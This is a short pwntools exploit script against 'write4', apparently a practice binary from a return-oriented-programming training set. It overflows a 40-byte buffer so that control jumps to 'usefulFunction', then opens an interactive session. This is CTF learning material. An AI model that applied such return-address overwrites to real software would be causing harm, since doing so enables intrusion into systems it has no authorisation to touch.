#!/usr/bin/env python3

from pwn import *

elf = ELF('./write4')
context.bits = 64

usefulFunction = elf.symbols['usefulFunction']

payload = flat( 
    b'A'*40,
    usefulFunction
)

p = elf.process()

p.send(payload)
p.interactive()